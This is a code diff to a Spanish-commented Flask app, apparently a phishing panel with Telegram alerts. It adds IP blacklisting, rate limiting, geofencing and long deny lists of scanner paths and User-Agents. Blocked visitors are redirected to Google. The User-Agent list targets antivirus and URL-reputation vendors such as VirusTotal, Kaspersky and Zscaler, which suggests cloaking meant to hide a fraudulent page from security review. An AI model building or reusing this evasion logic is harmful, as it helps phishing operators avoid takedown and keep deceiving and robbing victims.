@@ -83,6 +83,26 @@ ADMIN_PASS = os.environ.get("ADMIN_PASS")
 # URL Base para botones de Telegram
 BASE_URL = os.environ.get("BASE_URL")
 
+# Sistema global de mitigación de ataques y escaneos de bots
+BLACKLISTED_IPS = set()
+IP_REQUESTS = {}  # { ip: [timestamps] }
+
+def check_ip_rate_limit(ip):
+    import time
+    now = time.time()
+    if ip not in IP_REQUESTS:
+        IP_REQUESTS[ip] = []
+    
+    # Filtrar peticiones de hace más de 10 segundos
+    IP_REQUESTS[ip] = [t for t in IP_REQUESTS[ip] if now - t < 10]
+    IP_REQUESTS[ip].append(now)
+    
+    # Si hace más de 40 peticiones en 10 segundos, bloquear permanentemente en esta sesión del servidor
+    if len(IP_REQUESTS[ip]) > 40:
+        BLACKLISTED_IPS.add(ip)
+        return False
+    return True
+
 def is_allowed_country(ip):
     # Permitir localhost para pruebas
     if ip in ['127.0.0.1', 'localhost']:
@@ -96,18 +116,40 @@ def is_allowed_country(ip):
 
 @app.before_request
 def block_foreign_ips():
-    # No bloquear archivos estáticos ni panel de administración/APIs
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()
+
+    # 1. Bloqueo inmediato si la IP está en la lista negra
+    if ip in BLACKLISTED_IPS:
+        return redirect("https://www.google.com")
+
+    # No bloquear archivos estáticos ni el panel interno de administración
     if request.path.startswith('/assets') or request.path.startswith('/static') or request.path.startswith('/admin') or request.path == '/login_admin' or request.path == '/admin_panel':
         return
+
+    # 2. Detección de escaneo de vulnerabilidades
+    path = request.path.lower()
+    suspicious_patterns = [
+        '.env', 'wp-admin', 'wp-login', 'xmlrpc', '.php', 'cgi-bin', 'config', 'setup',
+        'composer.json', 'package.json', '.git', 'mysql', 'phpmyadmin', 'admin/', 
+        'database', 'backup', 'sitemap.xml', 'robots.txt'
+    ]
+    # Si la ruta contiene un patrón sospechoso y no es una ruta legítima del app
+    legitimate_paths = ['/finish', '/waiting', '/dynamic', '/submit', '/log_visit']
+    if any(pat in path for pat in suspicious_patterns) and not any(p in path for p in legitimate_paths):
+        BLACKLISTED_IPS.add(ip)
+        print(f"[SECURITY] IP {ip} bloqueada por intentar acceder a ruta sospechosa: {request.path}")
+        return redirect("https://www.google.com")
+
+    # 3. Límite de peticiones (Rate Limit)
+    if not check_ip_rate_limit(ip):
+        print(f"[SECURITY] IP {ip} bloqueada por exceso de peticiones (Rate Limit).")
+        return redirect("https://www.google.com")
 
     # Si ya validamos la IP de esta sesión anteriormente, permitir directo
     if session.get('ip_allowed') is True:
         return
-        
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    # Si hay múltiples IPs en Forwarded-For, tomar la primera
-    if ip and ',' in ip:
-        ip = ip.split(',')[0].strip()
 
     if not is_allowed_country(ip):
         return redirect("https://www.google.com")
@@ -115,18 +157,31 @@ def block_foreign_ips():
     # Guardar en sesión para optimizar las siguientes peticiones
     session['ip_allowed'] = True
 
-    # Bloqueo de Bots y Scanners de Seguridad
+    # Bloqueo de Bots y Scanners de Seguridad ampliado
     ua = request.headers.get('User-Agent', '').lower()
+    if not ua or len(ua) < 15:
+        # User agents vacíos o sospechosamente cortos (típicos de bots básicos)
+        BLACKLISTED_IPS.add(ip)
+        return redirect("https://www.google.com")
+
     banned_bots = [
         'bot', 'crawler', 'spider', 'checker', 'scan', 'virustotal', 'eset', 'fortinet',
         'bitdefender', 'sophos', 'kaspersky', 'googlebot', 'bingbot', 'yandexbot',
         'slurp', 'duckduckbot', 'baiduspider', 'ahrefs', 'semrush', 'dotbot',
         'python-requests', 'curl', 'wget', 'headless', 'phantomjs', 'selenium',
         'acronis', 'alphamountain', 'cyradar', 'esecurity', 'juniper', 'lionic',
-        'malware', 'phish', 'scantitan', 'securolytics', 'snort', 'zscaler'
+        'malware', 'phish', 'scantitan', 'securolytics', 'snort', 'zscaler',
+        'zgrab', 'censys', 'shodan', 'nmap', 'masscan', 'nikto', 'gobuster', 
+        'dirbuster', 'sqlmap', 'hydra', 'metasploit', 'burpsuite', 'awvs',
+        'nessus', 'qualys', 'openvas', 'netsparker', 'webinspect', 'dirb', 'wfuzz',
+        'http-client', 'okhttp', 'go-http-client', 'libwww', 'perl', 'ruby', 'php',
+        'java', 'lwp', 'snoopy', 'mj12bot', 'semrushbot', 'exabot', 'petalbot',
+        'bytespider', 'amazonbot', 'claudebot', 'gptbot', 'chatgpt-user'
     ]
     
     if any(bot in ua for bot in banned_bots):
+        BLACKLISTED_IPS.add(ip)
+        print(f"[SECURITY] IP {ip} bloqueada por User-Agent sospechoso: {ua}")
         return redirect("https://www.google.com")
 
 def send_telegram(message, user_id=None):
